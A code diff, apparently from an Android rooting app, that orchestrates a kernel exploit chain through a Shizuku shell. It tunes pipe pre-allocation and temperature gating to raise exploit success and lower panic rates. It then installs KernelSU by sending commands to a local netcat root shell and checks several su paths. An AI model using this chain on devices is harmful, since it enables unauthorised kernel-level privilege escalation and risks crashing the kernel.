+  /// · pipe 页预算（`pipe-user-pages-soft/hard`）—— 别的进程占多了，F_SETPIPE_SZ 会 EPERM，
+  ///   载体变小 ⇒ 落位率下降 ⇒ 更容易 panic（日志里的 `v8_pipe first F_SETPIPE_SZ=-1`）
+  /// · 后台进程数 + 内存前三名 —— 直接对应"其它 App 在后台"这个假设
+  Future<void> _envProbe(String tag) async {
+    try {
+      final r = await ShizukuShell.run(
+        'echo W=\$(dumpsys power 2>/dev/null | grep -m1 mWakefulness= | cut -d= -f2)'
+        '; echo MA=\$(grep -m1 MemAvailable /proc/meminfo | tr -s " " | cut -d" " -f2)'
+        '; echo DIRTY=\$(grep -m1 Dirty /proc/meminfo | tr -s " " | cut -d" " -f2)'
+        '; echo SWF=\$(grep -m1 SwapFree /proc/meminfo | tr -s " " | cut -d" " -f2)'
+        '; echo NPROC=\$(ls /proc 2>/dev/null | grep -cE "^[0-9]")'
+        // pipe 页预算文件是 0600，shell 读不到（su 才行）；用 ps 的前三大户间接判断后台压力
+        '; echo TOP=\$(ps -A -o rss,args 2>/dev/null | sort -rn | head -3'
+        ' | sed -E "s/^ +//" | cut -d" " -f1,2 | tr "\\n" ",")');
+      final m = <String, String>{};
+      for (final line in r.out.split('\n')) {
+        final i = line.indexOf('=');
+        if (i > 0) m[line.substring(0, i).trim()] = line.substring(i + 1).trim();
+      }
+      final wake = m['W'] ?? '';
+      _log('[envprobe:$tag] 唤醒=$wake 内存可用=${m['MA'] ?? '?'}KB '
+          'Dirty=${m['DIRTY'] ?? '?'}KB swap=${m['SWF'] ?? '?'}KB '
+          '进程=${m['NPROC'] ?? '?'} 内存前三(仅参考·不会被杀)=${m['TOP'] ?? '?'}');
+      if (wake.isNotEmpty && wake != 'Awake') {
+        _log('[envprobe:$tag] ⚠ 屏幕不在 Awake（$wake）⇒ 会先点屏唤醒；'
+            '若仍 Dozing/Sleep，命中与落位都会显著变差');
+      }
+    } catch (_) {}
+  }
+
+  /// 确保屏幕是 Awake（Dozing 直接开打必亏）
+  Future<bool> _ensureAwake() async {
+    for (var i = 0; i < 3; i++) {
+      final w = await ShizukuShell.run(
+          'dumpsys power 2>/dev/null | grep -m1 mWakefulness= | cut -d= -f2');
+      final v = w.out.trim();
+      if (v == 'Awake') return true;
+      _log('[wake] 当前 $v ⇒ 点屏唤醒（第 ${i + 1}/3 次）');
+      await ShizukuShell.run(
+          'input keyevent 224; svc power stayon true; input tap 540 1200');
+      await _sleep(1500);
+    }
+    final w = await ShizukuShell.run(
+        'dumpsys power 2>/dev/null | grep -m1 mWakefulness= | cut -d= -f2');
+    return w.out.trim() == 'Awake';
+  }
+
+  /// 开打前的温度闸（读 thermal_zone0，单位 m℃）
+  ///
+  /// 分级参考同类公开实现的温度方案（三档写死）：
+  ///   · **≤40°C = 最佳**      → 直接打
+  ///   · **40–55°C = 可用**    → 照打，日志提醒
+  ///   · **>55°C = 偏高**      → 先等降温（10s × 30 = 最多 5 分钟）
+  /// 另外两点也照抄：
+  ///   · 读数做取值范围校验（只接受 10000–120000，挡掉异常/瞬时的坏值）
+  ///   · **跑链期间不读**（同类实现的监控面板此时直接显示"已暂停读取"）
+  /// 开打前预创建的 pipe 数。**这个值直接决定 512KB 管道载体能不能建起来**：
+  /// uid 2000 的管道页预算 = pipe-user-pages-soft = 16384 页（64MB），
+  /// 每多一个 pipe 就吃掉若干页，预算一满，后续 fcntl(F_SETPIPE_SZ, 512KB) 全部 EPERM。
+  ///
+  /// 真机 A/B（docs/2026-10-26_AB_管道预算与panic率.md，冷机 25–32°C）：
+  ///   PRE_PIPES=20000 → F_SETPIPE_SZ=-1(EPERM)  16/26 = 62%（panic 12%）
+  ///   PRE_PIPES=512   → F_SETPIPE_SZ=524288     37/46 = 80%（panic 7%）
+  ///                     （两组独立复现：88% = 23/26、70% = 14/20）
+  ///   PRE_PIPES=0     → 也成功，但只有 13/20 = 65%（预建的那批 pipe 本身也在帮忙）
+  ///   PRE_PIPES=2048  → 又变 -1（2048×8页 = 16384，正好撞上限）
+  /// 所以只能取 ≤512。
+  /// **新版（默认）**：512 —— 让 512KB 管道载体能建起来（真机 A/B：落位 62% → 80%）
+  static const int kPrePipesModern = 512;
+
+  /// **classic（v1.0.16 的行为）**：20000 —— 预建管道把 uid 2000 的 64MB 预算占满，
+  /// 512KB 载体必然 EPERM。保留它只为"回退对比/排障"，默认不用。
+  static const int kPrePipesClassic = 20000;
+
+  /// 当前生效的预建管道数
+  int get prePipes =>
+      optParamSet == ParamSet.classic ? kPrePipesClassic : kPrePipesModern;
+  static const int _tempBestMc = 40000;    // ≤40 最佳
+  static const int _tempOkMc = 55000;      // ≤55 可用；>55 偏高
+  static const int _tempGateTries = 30;    // 最多等 30×10s = 5 分钟
+
+  /// 温度分档（UI 与日志共用）：0=最佳 1=可用 2=偏高
+  static int tempTier(int mC) => mC <= _tempBestMc ? 0 : (mC <= _tempOkMc ? 1 : 2);
+
+  /// 三档温度闸。数值来自真机实测：
+  /// 冷机 25–32°C 落位 80% / panic 7%；≥50°C 落位 42% / 频繁重启；
+  /// 84–88°C 仍能命中但整发崩掉的比例明显上升 ⇒ 温度是概率打击。
+
+
+  /// [relaxed] 用于 phase1/phase2：实测 P1/P2 在 37–42°C 也是一发命中，
+  /// 没必要按用户档位长等；这里只挡真正过热的（>48°C 才等、60s 封顶、>58°C 放弃）。
+  Future<void> _cooldownGate({bool relaxed = false}) async {
+    final limitMc = relaxed ? 48000 : optTempGate.limitMc;
+    final tries = relaxed ? 6 : optTempGate.tries;
+    final abortMc = relaxed ? 58000 : optTempGate.abortMc;
+    for (var i = 0; i < tries; i++) {
+      final zoneName = readTempZoneName();
+      final raw = readTempMc();      // 直读文件，不 spawn shell
+      if (raw == 0) {
+        if (i == 0) _log('[temp] 读数异常 ⇒ 跳过温度闸');
+        return;
+      }
+      health['T'] = '$raw';
+      notifyListeners();
+      final c = (raw / 1000).toStringAsFixed(1);
+      if (raw > limitMc) {
+        _log('[temp]（${optTempGate.title}档）机身 ${c}°C（$zoneName）偏高（>${limitMc ~/ 1000}°C），等 10s 降温'
+            '（第 ${i + 1}/$tries 次）');
+        await ShizukuShell.run('input keyevent 224 2>/dev/null');
+        await _sleep(10000);
+        continue;
+      }
+      if (raw > _tempBestMc) {
+        _log('[temp] 机身 ${c}°C（$zoneName）可用（${_tempBestMc ~/ 1000}–${limitMc ~/ 1000}°C），开打');
+      } else if (i > 0) {
+        _log('[temp] ${c}°C（$zoneName）最佳（≤40°C），开打');
+      }
+      return;
+    }
+    final raw2 = readTempMc();
+    final c2 = (raw2 / 1000).toStringAsFixed(1);
+    if (raw2 > abortMc) {
+      _log('[temp] ✗（${optTempGate.title}档）等满 ${tries * 10 ~/ 60} 分钟仍有 ${c2}°C'
+          '（>${abortMc ~/ 1000}°C）⇒ 放弃本轮');
+      lastError = '机身 ${c2}°C 持续降不下来（${optTempGate.title}档上限 ${abortMc ~/ 1000}°C）：'
+          '先关屏静置 10–15 分钟，或拔掉充电线/加散热再跑；这个温度打下去几乎必定 panic';
+      _stop = true;
+      return;
+    }
+    _log('[temp]（${optTempGate.title}档）等满 ${tries * 10 ~/ 60} 分钟仍在 ${c2}°C：'
+        '照打，但 panic 概率会升高');
+  }
+
+  /// 每发打之前落一行元数据，方便事后把 panic 与温度/内存关联起来
+  Future<void> _shotMeta(String stage) async {
+    final t = readTempMc();
+    final r = await ShizukuShell.run(
+        'echo "stage=$stage param=${optParamSet.name} pre_pipes=$prePipes temp_mc=$t '
+        'uptime=\$(cut -d. -f1 /proc/uptime) '
+        'memfree=\$(grep MemFree /proc/meminfo | tr -s " " | cut -d" " -f2) '
+        'procs=\$(ls /proc | grep -cE "^[0-9]") '
+        // 频率与充电状态：热降频会改变竞态窗口的时间尺度，事后统计必须能分开这两者
+        'cpu=\$(cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq 2>/dev/null) '
+        'chg=\$(cat /sys/class/power_supply/battery/status 2>/dev/null) '
+        'ts=\$(date +%H:%M:%S)" >> /data/local/tmp/rk/meta.log 2>/dev/null');
+    // 失败无所谓，纯诊断用
+    if (r.code != 0) return;
+  }
+
+  Future<bool> _ksuSuReady() async {
+    final r = await ShizukuShell.run(
+        'command -v su >/dev/null 2>&1 && echo Y || '
+        '([ -x /data/adb/ksud ] && echo Y) || echo N');
+    return r.out.contains('Y');
+  }
+
+  /// 自己执行 KernelSU 的用户态安装（管理器"安装"按钮做的第二件事）
+  ///
+  /// 相当于：
+  ///   `<nativeLibDir>/libksud.so install --libadbroot <nativeLibDir>/libadbroot.so
+  ///                                    --data-path /data/user_de/0/me.weishu.kernelsu`
+  /// 效果：/data/adb/ksud 就位 + /data/adb/ksu/{bin,lib} 解包 + 软链；
+  /// 之后内核的 sucompat 才会把 `su` 劫持到 ksud（见 kernel/feature/sucompat.c）。
+  /// 全程只写 /data/adb，不需要解锁 BL、不碰 boot.img。
+  Future<bool> _ksuUserspaceInstall() async {
+    const pkg = 'me.weishu.kernelsu';
+    // 1) 找 nativeLibDir（libksud.so / libadbroot.so 在那里）
+    final r = await ShizukuShell.run(
+        'A=\$(pm path $pkg 2>/dev/null | head -1 | sed "s/^package://")'
+        '; B=\$(dirname "\$A")'
+        '; for d in "\$B"/lib/*; do [ -f "\$d/libksud.so" ] && echo LIB=\$d; done'
+        '; echo DEVDIR=/data/user_de/0/$pkg'
+        '; echo HAVEDEV=\$([ -d /data/user_de/0/$pkg ] && echo 1 || echo 0)');
+    final lib = RegExp(r'^LIB=(\S+)', multiLine: true).firstMatch(r.out)?.group(1) ?? '';
+    if (lib.isEmpty) {
+      _log('[ksu] 找不到 libksud.so（pm path 拿不到 nativeLibDir）：${r.out.trim()}');
+      return false;
+    }
+    _log('[ksu] 用户态安装：$lib/libksud.so install …（KernelSU 自己也是跑这一条）');
+    final cmd = '"$lib/libksud.so" install'
+        ' --libadbroot "$lib/libadbroot.so"'
+        ' --data-path /data/user_de/0/$pkg'
+        ' 2>&1; echo INSTALL_RC=\$?'
+        '; ls -l /data/adb/ksud /data/adb/ksu/bin/ksud 2>&1 | head -3'
+        '; echo SUCHK=\$(command -v su 2>/dev/null || echo none)';
+    final x = await ShizukuShell.run('echo ${_shq(cmd)} | nc 127.0.0.1 5556 2>&1');
+    _log('[ksu] 安装结果：${x.out.trim()}');
+    final ok = RegExp(r'INSTALL_RC=0').hasMatch(x.out) ||
+        RegExp(r'/data/adb/ksud').hasMatch(x.out);
+    return ok;
+  }
+
+  /// 上次重启的原因（panic 现场）
+  ///
+  /// 只有拿到 root 才读得到：`/sys/fs/pstore/*` 是 ramoops（上一次崩溃的内核日志），
+  /// `/proc/last_kmsg` 是更老的接口。App 每次拿到 root 就顺手抓一次，
+  /// 下次再遇到"莫名重启"时，日志里直接有 panic 的那几行。
+  Future<void> collectLastCrash() async {
+    try {
+      final cmd = 'echo PSTORE=\$(ls /sys/fs/pstore 2>/dev/null | tr "\\n" ",")'
+          '; echo RESET=\$(getprop sys.resettype 2>/dev/null)'
+          '; echo LAST=\$(getprop sys.boot.reason.last 2>/dev/null)'
+          '; echo ---RAMOOPS-TAIL---'
+          '; for f in /sys/fs/pstore/console-ramoops* /sys/fs/pstore/dmesg-ramoops*; do'
+          ' [ -f "\$f" ] && { echo "## \$f"; grep -aE "Kernel panic|Unable to handle|Internal error|BUG:|Oops|pc :|lr :|Call trace" "\$f" | tail -12; }; done'
+          '; echo ---LASTKMSG---'
+          '; [ -f /proc/last_kmsg ] && grep -aE "Kernel panic|Unable to handle|Internal error|BUG:|Oops" /proc/last_kmsg | tail -8'
+          '; echo ---END---';
+      final r = await ShizukuShell.run('echo ${_shq(cmd)} | nc 127.0.0.1 5556 2>&1');
+      final t = r.out.trim();
+      if (t.isEmpty) return;
+      _log('[crash] 上次重启现场：');
+      for (final l in t.split('\n')) {
+        if (l.trim().isNotEmpty) _log('  $l');
+      }
+    } catch (_) {}
+  }
+
+  /// ⑦ 的真实状态：**模块加载成功 ≠ KernelSU 可用**
+  ///
+  /// 三件事要分开看：
+  /// 1. `/proc/modules` 里有 `kernelsu`（insmod/finit 成功）
+  /// 2. `/sys/module/kernelsu` 存在（模块真的注册进 sysfs，能区分"载入即返回"的假成功）
+  /// 3. `su` 存在（**由管理器释放**，与 1/2 无关）
+  Future<Map<String, String>> _ksuState() async {
+    final m = <String, String>{};
+    try {
+      final r = await ShizukuShell.run(
+        'echo MODCNT=\$(grep -c "^kernelsu" /proc/modules 2>/dev/null || echo 0)'
+        '; echo SYSFS=\$([ -d /sys/module/kernelsu ] && echo 1 || echo 0)'
+        '; echo MODLINE=\$(grep "^kernelsu" /proc/modules 2>/dev/null | head -1 | cut -c1-90)'
+        '; echo SU=\$(command -v su 2>/dev/null || ls /data/adb/ksu/bin/su 2>/dev/null || echo)'
+        '; echo KSUDIR=\$([ -d /data/adb/ksu ] && echo 1 || echo 0)'
+        '; echo APP=\$(pm list packages 2>/dev/null | grep -c me.weishu.kernelsu)');
+      for (final line in r.out.split('\n')) {
+        final i = line.indexOf('=');
+        if (i > 0) m[line.substring(0, i).trim()] = line.substring(i + 1).trim();
+      }
+    } catch (_) {}
+    return m;
+  }
+
+  /// ⑦ 之后：KernelSU 模块已在 /proc/modules，但 **su 是由管理器（KSU App）释放到
+  /// /data/adb/ksu/bin 的**，模块加载 ≠ su 可用。这里等最多 10s 并记录现场。
+  Future<void> _afterKsuLoaded() async {
+    // 1) 先等几秒（有的是 insmod 后立刻可读）
+    for (var i = 0; i < 3; i++) {
+      final r = await ShizukuShell.run(
+          'ls /data/adb/ksu/bin/su /system/bin/su 2>/dev/null | head -1');
+      if (r.out.trim().isNotEmpty) break;
+      await _sleep(2000);
+    }
+    // 2) 还没有 su ⇒ 自己跑 KernelSU 的**用户态安装**（管理器里的"安装"做的就是这件事）
+    //
+    // 依据 KernelSU 源码：
+    //  · kernel/feature/sucompat.c:4  `#define SU_PATH "/system/bin/su"`，
+    //    在 faccessat/newfstatat/execve 上把 su 劫持成 **/data/adb/ksud**，
+    //    且只有 `is_ksud_exists()` 为真时才劫持 ⇒ 没有 /data/adb/ksud 时 `su` 就是 ENOENT。
+    //  · kernel/runtime/ksud.h:6 `KSUD_PATH "/data/adb/ksud"`。
+    //  · 管理器的 install()（ui/util/KsuCli.kt）只是执行
+    //    `<nativeLibDir>/libksud.so install --libadbroot <libadbroot.so> --data-path <deviceProtectedDataDir>`，
+    //    而 userspace/ksud/src/utils.rs::install() 就是把自己拷到 /data/adb/ksud + 解出 assets + 建软链。
+    //  ⇒ 我们已经有 root（⑥ 的自制模块），可以自己把这一步做掉，**不需要解锁 BL、不需要刷 boot.img**。
+    if (await _ksuSuReady() == false) {
+      // 只在「模块确实注册进 sysfs」且「本 boot 还没试过」时才动 ksud install：
+      // 往半加载的 KSU 模块发 prctl 有可能把内核打崩（真机出现过早期 panic，等 [crash] 证实）
+      final ks = await _ksuState();
+      // 门控用 /proc/modules（有 kernelsu）而不是 /sys/module（后者在 KSU LKM 上可能是缺失的）
+      final sysfsOk = (ks['SYSFS'] ?? '0') == '1' || (ks['MODCNT'] ?? '0') != '0';
+      final tried = await ShizukuShell.run(
+          'ls /data/local/tmp/rk/.ksud_tried_\$(cat /proc/sys/kernel/random/boot_id) 2>/dev/null');
+      if (!sysfsOk) {
+        _log('[ksu] 跳过用户态安装：/sys/module/kernelsu 不存在（模块没真正注册，戳它会崩）');
+      } else if (tried.out.trim().isNotEmpty) {
+        _log('[ksu] 本 boot 已试过 ksud 安装，跳过（避免重复戳内核）');
+      } else {
+        await ShizukuShell.run(
+            'touch /data/local/tmp/rk/.ksud_tried_\$(cat /proc/sys/kernel/random/boot_id)');
+        await _ksuUserspaceInstall();
+      }
+    }
+    // 3) 还没有 su ⇒ 把 KernelSU 管理器**拉起来一次**
+    //    su/ksud 是管理器在"检测到内核"之后才释放到 /data/adb/ksu/bin 的，没人打开它就一直空着。
+    //    注意：这不是让它走"安装/修复"（那是解锁后改 boot.img 的注入流程，与本 LKM 路径无关）。
+    if (await _ksuSuReady() == false) {
+      final am = await ShizukuShell.run(
+          'am start -n me.weishu.kernelsu/.ui.MainActivity 2>&1 '
+          '|| monkey -p me.weishu.kernelsu -c android.intent.category.LAUNCHER 1 2>&1');
+      _log('[ksu] su 尚未出现，已尝试拉起 KernelSU 管理器：'
+          '${am.out.trim().split("\n").last}');
+      for (var i = 0; i < 4; i++) {
+        await _sleep(2000);
+        final r = await ShizukuShell.run(
+            'ls /data/adb/ksu/bin/su /system/bin/su 2>/dev/null | head -1');
+        if (r.out.trim().isNotEmpty) {
+          _log('[ksu] 管理器初始化完成，su 已就位：${r.out.trim()}');
+          break;
+        }
+      }
+      // 拉起后把界面收回去，别挡住用户
+      await ShizukuShell.run('am force-stop me.weishu.kernelsu 2>/dev/null');
+    }
+    final st = await _ksuState();
+    final modOk = (int.tryParse(st['MODCNT'] ?? '0') ?? 0) > 0;
+    final sysfs = (st['SYSFS'] ?? '0') == '1';
+    _log('[ksu] 模块状态：/proc/modules=${modOk ? "有 kernelsu" : "无"}'
+        ' · /sys/module/kernelsu=${sysfs ? "存在" : "缺失"}'
+        ' · su=${(st['SU'] ?? '').isEmpty ? "缺失" : st['SU']}'
+        ' · /data/adb/ksu=${(st['KSUDIR'] ?? '0') == '1' ? "已初始化" : "未初始化"}');
+    if (modOk && !sysfs) {
+      // 真机实测：KernelSU LKM 报 "no extended symbol version for module_layout" /
+      // "overflow in relocation type 275"，sysfs 注册失败（/sys/module/kernelsu 确实不存在），
+      // 但 sucompat hook 已生效、su 可用 ⇒ 只记信息，不再当失败信号。
+      _log('[ksu] 注：/sys/module/kernelsu 不存在属已知现象（LKM 的 sysfs 注册失败），'
+          '最终以 su 是否可用为准');
+    }
+    await _diag('ksu');
+    await _diagRoot('ksu');
   }
 
   Future<void> _runKsu() async {
@@ -1170,6 +2332,7 @@ class RootChain extends ChangeNotifier {
         _log('[ksu] 候选进程已自行加载 kernelsu（无需 root shell）');
         final sc = await ShizukuShell.run('cat $workDir/ksu_self.log 2>/dev/null | tail -6');
         if (sc.out.trim().isNotEmpty) _log(sc.all);
+        await _afterKsuLoaded();
         _stage(StageId.ksu, StageStatus.ok, detail: 'kernelsu 已加载（自加载路径）');
         _advice();
         return;
@@ -1199,6 +2362,7 @@ class RootChain extends ChangeNotifier {
     final chk = await ShizukuShell.run('grep -c kernelsu /proc/modules');
     final n = int.tryParse(chk.out.trim()) ?? 0;
     if (n > 0) {
+      await _afterKsuLoaded();
       _stage(StageId.ksu, StageStatus.ok, detail: 'kernelsu 已加载');
       _advice();
       return;
@@ -1214,21 +2378,67 @@ class RootChain extends ChangeNotifier {
   Future<void> _runVerify() async {
     _stage(StageId.verify, StageStatus.running, detail: 'su 验证…');
     phase = '验证 su';
-    final r = await ShizukuShell.run('su -c id 2>&1');
-    _log('[verify] ${r.all}');
-    final okRoot = RegExp(r'uid=0\(root\)').hasMatch(r.out) ||
-        r.out.contains('u:r:ksu:s0');
-    if (okRoot) {
-      _stage(StageId.verify, StageStatus.ok, detail: 'su 可用 · ' + r.all.split('\n').first);
+    // su 不一定在 PATH：KernelSU 的 su 由管理器放到 /data/adb/ksu/bin，
+    // 也有机型是 /system/xbin/su 或 /debug_ramdisk/su。逐个试，全部记录（排障用）。
+    const cands = <String>[
+      'su',
+      '/system/bin/su',
+      '/system/xbin/su',
+      '/data/adb/ksu/bin/su',
+      '/debug_ramdisk/su',
+    ];
+    String? hitPath;
+    String? hitLine;
+    for (final p in cands) {
+      final r = await ShizukuShell.run('$p -c id 2>&1');
+      final out = r.out.trim();
+      final first = out.isEmpty ? '(空)' : out.split('\n').first;
+      _log('[verify] $p → $first');
+      if (RegExp(r'uid=0\(root\)').hasMatch(out) || out.contains('u:r:ksu:s0')) {
+        hitPath = p;
+        hitLine = first;
+        break;
+      }
+    }
+    if (hitLine != null) {
+      _stage(StageId.verify, StageStatus.ok, detail: 'su 可用（$hitPath）· $hitLine');
       success = true;
       phase = '越狱成功';
-      _log('[verify] 成功：${r.all.split('\n').first}');
+      _log('[verify] 成功：$hitLine');
       await cleanupAfterSuccess();
       _log('[verify] 若 KernelSU 面板仍显示"未安装/未工作"，先对 KernelSU 清后台或用软重启，再打开它');
-    } else {
-      _stage(StageId.verify, StageStatus.failed, detail: 'su 不可用');
-      lastError = 'su 不可用';
+      _advice();
+      return;
     }
+
+    // 失败：把「模块是否在、管理器是否装、su 在哪、dmesg 说啥」一次性打进日志
+    await _diag('verify-fail');
+    await _diagRoot('verify-fail');
+    final st = await _ksuState();
+    final ksuLoaded = (int.tryParse(st['MODCNT'] ?? '0') ?? 0) > 0;
+    final sysfs = (st['SYSFS'] ?? '0') == '1';
+    final appInstalled = (int.tryParse(st['APP'] ?? '0') ?? 0) > 0;
+    final dirExists = (st['KSUDIR'] ?? '0') == '1';
+    _log('[verify] 现场：kernelsu 模块=${ksuLoaded ? "有" : "无"} · sysfs=${sysfs ? "有" : "无"}'
+        ' · 管理器=${appInstalled ? "已装${ksuAppVersion.isEmpty ? "" : " v$ksuAppVersion"}" : "未装"}'
+        ' · /data/adb/ksu=${dirExists ? "已初始化" : "未初始化"}');
+
+    String why;
+    if (ksuLoaded && !dirExists) {
+      why = 'KernelSU 模块已加载，但 /data/adb/ksu 不存在 ⇒ 管理器还没初始化。'
+          'su/ksud 是管理器**检测到内核后**才释放到 /data/adb/ksu/bin 的：'
+          '手动打开一次 KernelSU（不是点它的"安装"，那是解锁后改 boot.img 的注入流程），'
+          '再回来重跑 ⑦⑧；若它打开后仍显示"未安装"，把本页日志发给作者（[diag-root] 里有内核镜像核对结果）';
+    } else if (ksuLoaded && !appInstalled) {
+      why = 'KernelSU 模块已加载，但没装 KernelSU 管理器 ⇒ 没有 su。装好管理器并打开一次，再重跑 ⑦⑧';
+    } else if (!ksuLoaded) {
+      why = 'su 不存在且 kernelsu 模块不在 /proc/modules ⇒ ⑦ 其实没成功，重跑 ⑦';
+    } else {
+      why = 'su 不存在（模块在、管理器在）：看日志 [diag-root:verify-fail] 的 dmesg KSU 行';
+    }
+    _log('[verify] 失败原因判定：$why');
+    _stage(StageId.verify, StageStatus.failed, detail: 'su 不存在');
+    lastError = why;
     _advice();
   }
 
